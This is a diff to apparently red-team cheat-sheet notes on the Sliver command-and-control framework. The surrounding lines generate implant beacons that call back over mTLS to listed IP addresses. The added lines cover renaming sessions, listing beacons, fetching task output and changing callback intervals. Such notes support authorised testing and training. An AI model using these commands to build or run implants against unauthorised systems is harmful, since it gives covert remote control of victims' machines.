@@ -162,6 +162,28 @@ sliver > generate beacon --mtls 192.168.122.111 --os windows --arch amd64 --form
 generate beacon -a amd64 -c google.com -f exe -J 300 -k 3000 --mtls 10.10.10.10:8080 --name main -o linux -j 1800 --save /opt/sliver/main -S 1800 -t 3600
 ```
 
+### Rename Session / Beacon&#x20;
+
+```
+rename --name <newname>
+```
+
+### View Beacon Tasks
+
+```
+sliver > beacons
+
+ ID         Name         Transport   Hostname       Username   Operating System   Last Check-In   Next Check-In 
+========== ============ =========== ============== ========== ================== =============== ===============
+ b3b9f2ee   carter_one   mtls          devel          root       linux/amd64        2m15s           57m47s     
+```
+
+* interact with `use`
+* view tasks with `tasks`
+* view output of tasks with `task fetch <id>`
+* reconfigure an implant to callback at a certain frequency&#x20;
+* `reconfig -i 1800 -j 5m -t 3600 -r 1800s`
+
 ### Sliver Survey
 
 * Execute the following commands in order upon session opening
